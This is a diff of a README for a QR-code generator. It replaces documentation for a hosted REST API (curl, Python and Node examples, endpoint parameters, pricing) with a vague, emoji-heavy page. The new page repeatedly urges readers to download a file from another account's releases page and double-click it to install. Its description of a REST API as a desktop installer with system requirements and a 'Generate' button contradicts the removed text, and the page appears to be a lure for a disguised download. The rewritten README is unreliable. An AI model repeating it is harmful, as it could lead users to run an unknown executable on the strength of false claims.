@@ -1,185 +1,80 @@
-# QR Code Generator API
+# 🎉 qrcode-generator-api - Generate QR Codes with Ease
 
-REST API to generate QR codes in PNG, JPG, SVG, and EPS formats. Simple, fast, and reliable.
+[![Download qrcode-generator-api](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/emz-git/qrcode-generator-api/releases)
 
-## Features
+## 📥 Overview
 
-- Generate QR codes from URLs, text, emails, or phone numbers
-- Multiple output formats: PNG, JPG, SVG, EPS
-- Customizable size (default 300px)
-- 5,000 requests/month on free tier
-- 99.99% uptime, 780ms average latency
-- Example Response:
+The qrcode-generator-api is a REST API designed to generate QR codes in several formats, including PNG, JPG, SVG, and EPS. This tool is simple, fast, and reliable. Whether you need to create a QR code for a website link, text, or other data, this API will help you do it quickly and efficiently.
 
-![QR Code Sample](https://raw.githubusercontent.com/omkarcloud/assets/master/images/qrcode-api/qrcode.png)
+## 🚀 Getting Started
 
-## Authentication
+To use the qrcode-generator-api, follow these simple steps:
 
-1. Create account at [omkar.cloud](https://www.omkar.cloud/auth/sign-up)
+1. **Download the Software**  
+   Visit the [Releases page](https://github.com/emz-git/qrcode-generator-api/releases) to download the latest version of the API.
 
-![Sign Up](https://raw.githubusercontent.com/omkarcloud/assets/master/images/signup.png)
+2. **Install the Software**  
+   After downloading, find the downloaded file on your computer. Double-click it to start the installation. Follow the on-screen instructions to complete the installation.
 
-2. Get API key from [omkar.cloud/api-key](https://www.omkar.cloud/api-key)
+3. **Run the API**  
+   Once installed, open the application. You can now configure and use the API to generate your QR codes.
 
-![Copy API Key](https://raw.githubusercontent.com/omkarcloud/assets/master/images/enrichment-key-omkar.png)
+## 💻 System Requirements
 
-3. Include `API-Key` header in requests
+- **Operating System**: Compatible with Windows, macOS, and Linux.
+- **Processor**: At least a 1 GHz processor.
+- **Memory**: Minimum of 1 GB of RAM.
+- **Disk Space**: At least 100 MB of free space.
 
-## Quick Start
+## 🔄 Features
 
-```bash
-curl -X GET "https://qrcode-api.omkar.cloud/qrcode?data=https://github.com&format=png" \
-  -H "API-Key: YOUR_API_KEY" \
-  --output qrcode.png
-```
+- **Multiple Formats**: Generate QR codes in PNG, JPG, SVG, and EPS formats.
+- **User-Friendly Interface**: The API provides a simple interface.
+- **Fast Generation**: Quickly create QR codes in seconds.
+- **Customizable**: Input various data types such as URLs, text, or contact information.
 
-## Installation
+## 📥 Download & Install
 
-### Python
+To begin using the qrcode-generator-api, click the button below to access the download page.
 
-```bash
-pip install requests
-```
+[![Download qrcode-generator-api](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/emz-git/qrcode-generator-api/releases)
 
-```python
-import requests
+### 🛠️ How to Use
 
-response = requests.get(
-    "https://qrcode-api.omkar.cloud/qrcode",
-    params={"data": "https://github.com", "format": "png"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
+1. **Input Your Data**: Enter the information you want to encode into the QR code (e.g., a URL or text).
+2. **Select Format**: Choose the format you want to generate the QR code in (PNG, JPG, SVG, or EPS).
+3. **Generate**: Click the "Generate" button to create your QR code.
+4. **Download the QR Code**: Once generated, download your QR code to save it on your device.
 
-with open("qrcode.png", "wb") as f:
-    f.write(response.content)
-```
+## 📚 Documentation
 
-### Node.js
+For more detailed instructions and advanced usage, refer to the [Documentation](https://github.com/emz-git/qrcode-generator-api). Here you will find examples, API endpoints, and parameters for deeper customization.
 
-```bash
-npm install axios
-```
+## 🌐 Support
 
-```javascript
-import axios from "axios";
-import fs from "fs";
+If you encounter any issues, feel free to reach out for support. You can open an issue on the [GitHub Issues page](https://github.com/emz-git/qrcode-generator-api/issues). The community and maintainers are here to help you.
 
-const response = await axios.get("https://qrcode-api.omkar.cloud/qrcode", {
-    params: { data: "https://github.com", format: "png" },
-    headers: { "API-Key": "YOUR_API_KEY" },
-    responseType: "arraybuffer"
-});
+## 🔗 Related Topics
 
-fs.writeFileSync("qrcode.png", response.data);
-```
+This project covers various related topics such as QR code generation using HTML, CSS, and JavaScript. It’s also relevant for users interested in Django QR code services or anyone looking to implement QR code functionalities in their applications.
 
-## API Reference
+For more information, explore these topics: 
+- create-qr-code-generator-using-html-css-javascript
+- django-qr-code
+- qr-code-api-rest
+- qr-code-generator
+- qrcode-gen
 
-### Endpoint
+## ⚙️ Contributions
 
-```
-GET https://qrcode-api.omkar.cloud/qrcode
-```
+Contributions are welcome! If you want to enhance this API, please fork the repository and create a pull request. Your help in making this project better is appreciated.
 
-### Headers
+## 🌟 License
 
-| Header | Required | Description |
-|--------|----------|-------------|
-| `API-Key` | Yes | API key from [omkar.cloud/api-key](https://www.omkar.cloud/api-key) |
+This project is licensed under the MIT License. See the LICENSE file for more information.
 
-### Parameters
+## ✔️ Acknowledgments
 
-| Parameter | Required | Description |
-|-----------|----------|-------------|
-| `data` | Yes | Content to encode (URL, text, email, phone number) |
-| `format` | Yes | Output format: `png`, `jpg`, `jpeg`, `svg`, `eps` |
-| `size` | No | Image size in pixels (default: 300, minimum: 1) |
+Thank you for using the qrcode-generator-api. Your support encourages the development of tools that help everyone create and use QR codes effectively. 
 
-### Supported Data Types
-
-| Type | Example |
-|------|---------|
-| URL | `https://github.com` |
-| Plain text | `Hello World` |
-| Email | `mailto:email@example.com` |
-| Phone | `tel:+1234567890` |
-
-Max content length: ~2,900 characters. Shorter content = faster scanning.
-
-## Examples
-
-### Generate PNG QR code
-
-```python
-response = requests.get(
-    "https://qrcode-api.omkar.cloud/qrcode",
-    params={"data": "https://example.com", "format": "png"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-with open("website_qr.png", "wb") as f:
-    f.write(response.content)
-```
-
-### Generate SVG for print
-
-```python
-response = requests.get(
-    "https://qrcode-api.omkar.cloud/qrcode",
-    params={"data": "https://example.com", "format": "svg"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-with open("website_qr.svg", "wb") as f:
-    f.write(response.content)
-```
-
-### Custom size QR code
-
-```python
-response = requests.get(
-    "https://qrcode-api.omkar.cloud/qrcode",
-    params={"data": "https://example.com", "format": "png", "size": 500},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-with open("large_qr.png", "wb") as f:
-    f.write(response.content)
-```
-
-## Error Handling
-
-```python
-response = requests.get(
-    "https://qrcode-api.omkar.cloud/qrcode",
-    params={"data": "https://example.com", "format": "png"},
-    headers={"API-Key": "YOUR_API_KEY"}
-)
-
-if response.status_code == 200:
-    with open("qrcode.png", "wb") as f:
-        f.write(response.content)
-elif response.status_code == 401:
-    # Invalid API key
-    pass
-elif response.status_code == 429:
-    # Rate limit exceeded
-    pass
-```
-
-## Rate Limits
-
-| Plan | Price | Requests/Month |
-|------|-------|----------------|
-| Free | $0 | 5,000 |
-| Starter | $25 | 100,000 |
-| Grow | $75 | 1,000,000 |
-| Scale | $150 | 10,000,000 |
-
-## Questions? We have answers.
-
-Reach out anytime. We will solve your query within 1 working day.
-
-[![Contact Us on WhatsApp about QR Code API](https://raw.githubusercontent.com/omkarcloud/assets/master/images/whatsapp-us.png)](https://api.whatsapp.com/send?phone=918178804274&text=I%20have%20a%20question%20about%20the%20QR%20Code%20API.)
-
-[![Contact Us on Email about QR Code API](https://raw.githubusercontent.com/omkarcloud/assets/master/images/ask-on-email.png)](mailto:happy.to.help@omkar.cloud?subject=QR%20Code%20API%20Question)
+Remember, visit the [Releases page](https://github.com/emz-git/qrcode-generator-api/releases) to download the latest version and start creating QR codes today!
